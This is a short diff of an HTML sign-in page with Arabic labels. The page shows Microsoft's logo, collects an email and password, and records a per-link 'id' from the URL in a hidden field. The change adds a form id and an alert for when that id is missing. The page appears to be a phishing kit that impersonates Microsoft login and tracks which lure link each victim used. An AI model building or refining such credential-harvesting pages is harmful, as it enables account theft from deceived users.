@@ -56,7 +56,7 @@
   <div class="login-box">
     <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
     <h2>تسجيل الدخول</h2>
-    <form action="/auth/login" method="POST">
+    <form id="loginForm" action="/auth/login" method="POST">
       <input type="email" name="email" class="form-control" placeholder="البريد الإلكتروني" required>
       <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
       <!-- حقل مخفي لتخزين الرابط المطلوب -->
@@ -66,11 +66,13 @@
   </div>
 
   <script>
-    // قراءة قيمة id من رابط الصفحة وإضافتها للحقل المخفي
+    // التقاط linkId من رابط الصفحة (مثل /auth/login?id=xxxx)
     const params = new URLSearchParams(window.location.search);
     const linkId = params.get('id');
     if (linkId) {
       document.getElementById('linkId').value = linkId;
+    } else {
+      alert("❌ لم يتم تمرير معرف الرابط (id).");
     }
   </script>
 </body>
